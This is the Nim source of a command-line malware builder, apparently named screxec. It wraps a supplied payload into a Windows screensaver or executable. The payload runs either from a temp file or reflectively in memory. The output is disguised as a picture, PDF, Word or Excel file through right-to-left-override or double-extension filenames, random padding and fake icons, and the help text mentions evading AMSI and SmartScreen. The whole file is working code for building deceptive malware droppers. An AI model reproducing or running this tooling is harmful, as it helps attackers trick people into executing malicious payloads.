import winim/com
import std/parseopt
import os
import osproc
import strutils, random
from algorithm import reversed
from sequtils import toSeq
randomize()
proc randomString(length: int): string =
  let alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  var result = ""
  for i in 0 ..< length:
    result.add(alphabet[rand(len(alphabet) - 1)])
  return result

var args = commandLineParams().join(" ")
var params = initOptParser(args)

var Payload:string
var TargetFile:string
var Output:string
var Type:string
var Naming:string
var filetype:string
var Rename:bool = true
var Ext:string = "scr"
var Randomlength:int = 0

proc showHelp():void =
    echo """Usage: screxec.exe [OPTIONS] (Target File)
Ex: screxec.exe --payload=payload.exe --type=ReflectivePE pict.jpg
Options:

    Basic:
    --payload=<path> Payload to embed in the end result, must be either DLL or a shellcode file.
    -p shorthand for --payload

    --output=<path> output file name, don't include the scr extension.
    -o shorthand for --output

    --type define how the scr file should execute the payload, can be Either:
        basic, ReflectivePE, or RunPE (default basic)
    -t shorthand for --type

    Advanced (might be useful for AMSI bypass):
    --naming=<rtl | normal> define how the file should be named, either using Right to left or normal.
        rtl or normal (default normal)
    -n shorthand for --naming

    --disable-rename don't rename the file and keep it in template/ directory.
    -d shorthand for --disable-rename

    --use-exe rename the output file with .exe extension instead of .scr
    -e shorthand for --use-exe

    --add-random=<length> add random string to filename (to prevent users from realizing the double ext)
    -r shorthand for --add-random

    """


while true:
  params.next()
  case params.kind
  of cmdEnd: break
  of cmdShortOption, cmdLongOption:
    if toLowerAscii(params.key) == "p" or toLowerAscii(params.key) == "payload":
        Payload = params.val
    elif toLowerAscii(params.key) == "o" or toLowerAscii(params.key) == "output":
        Output = params.val
    elif toLowerAscii(params.key) == "t" or toLowerAscii(params.key) == "type":
        Type = params.val
    elif toLowerAscii(params.key) == "n" or toLowerAscii(params.key) == "naming":
        Naming = params.val
    elif toLowerAscii(params.key) == "d" or toLowerAscii(params.key) == "disable-rename":
        Rename = false
    elif toLowerAscii(params.key) == "e" or toLowerAscii(params.key) == "exe-output":
        Ext = "exe"
    elif toLowerAscii(params.key) == "r" or toLowerAscii(params.key) == "add-random":
        Randomlength = parseInt(params.val)
    elif toLowerAscii(params.key) == "h" or toLowerAscii(params.key) == "help":
        showHelp()
        quit(0)
  of cmdArgument:
    TargetFile = params.key

if TargetFile == "":
    echo "Error: Please provide a valid target file."
    showHelp()
    quit(0)
var sp = rsplit(TargetFile, "/")
let FileName = sp[sp.len - 1]
echo "[I] Embedded file: "&FileName&"\nExtension: "&(rsplit(FileName, ".")[1])
# Any supplied output will always result in: (filename)rcs.(extension)
# ex: if i run main.exe with output option as "pict.jpg"
# the resulted file will be "pictrcs.jpg"
var x = rsplit(FileName, ".")
var extension = x[x.len - 1]
filetype = extension

var spam = randomString(Randomlength)
if Naming == "rtl":
    echo "[I] Using RTL naming convention"
    echo "[W] Sometimes executable with RTL names get caught by AMSI (Smartscreen actually), even if it does not use AMSI-triggering payloads."
    if Output == "":
        x.del(x.len - 1)
        var outputName = join(x, ".")
        outputName = outputName & spam & "\u202E" & toSeq(extension).reversed.join("") & "." & Ext
        Output = outputName
    else:
        var sp = rsplit(Output, "/")
        var fn = sp[sp.len - 1]
        var x = rsplit(fn, ".")
        x.del(x.len - 1)
        var outputName = join(x, ".")
        outputName = outputName & spam & "\u202E" & toSeq(extension).reversed.join("") & "." & Ext
        Output = outputName
else:
    echo "[I] Using normal naming convention (double extension)"
    echo "[W] Warning, this kind of name can be easily detected if your target set their explorer to show file extensions."
    if Output == "":
        Output = FileName & spam & "." & extension & "." & Ext
    else:
        var x = rsplit(Output, ".")
        var outname = join(x[0..len(x) - 2], ".")
        var outext = x[len(x) - 1]
        Output = outname & spam & "." & outext & "." & Ext
echo Payload
if Payload == "":
    echo "[I] No payload file provided, using default (payload/basic.exe)"
    Payload = "payload/basic.exe"
Payload = absolutePath(Payload)
TargetFile = absolutePath(TargetFile)
Output = absolutePath(Output)
var compileCommand = "nim c --threads:on -d:release -d:danger -d:strip --opt:size --app:gui "
var compileArgs = "-d:FilePath="&TargetFile
var compileTemplate = "template/basic.nim"
case Type:
    of "RunPE":
        echo "[I] Using method: RunPE, write executable to temp path and run it."
        compileArgs = compileArgs & " -d:PayloadPath=" & Payload
        compileTemplate = absolutePath("template/plain.nim")
    of "ReflectivePE":
        echo "[i] Using method: Reflective Run PE, write executable directly into memory."
        compileArgs = compileArgs & " -d:PayloadPath=" & Payload
        compileTemplate = absolutePath("template/reflectivePE.nim")
    else:
        echo "[I] Using basic method: Embedded Nim payload."
        compileTemplate = absolutePath(compileTemplate)

echo "[I] Compiling template file..."
var res = execCmdEx(compileCommand&compileArgs&" "&compileTemplate)
echo res[0]
var resSeq = rsplit(res[0], "\n")
echo resSeq[resSeq.len - 2]
# Sorry, i can't withstand Regex
var compiled = ((rsplit(resSeq[resSeq.len - 2], "out: "))[1]).replace(" [SuccessX]", "")
echo "[S] Compiled, result: "&compiled
if Rename:
    echo "[I] Renaming file by chosen naming convention"
    moveFile(compiled, Output)
    echo "[S] Successfully generated file: "&Output
else:
    echo "[I] Auto rename disabled, u can rename it by yourself later"

echo "[I] Changing file icon by its extension..."
if filetype == "jpg" or filetype == "png":
    discard execCmdEx("bin\\rcedit.exe \""&Output&"\" --set-icon assets/image.ico")
elif filetype == "pdf":
    discard execCmdEx("bin\\rcedit.exe \""&Output&"\" --set-icon assets/pdf.ico")
elif filetype == "docx":
    discard execCmdEx("bin\\rcedit.exe \""&Output&"\" --set-icon assets/word.ico")
elif filetype == "xlsx" or filetype == "csv" or filetype == "xlsx":
    discard execCmdEx("bin\\rcedit.exe \""&Output&"\" --set-icon assets/excel.ico")
echo "[S] Done"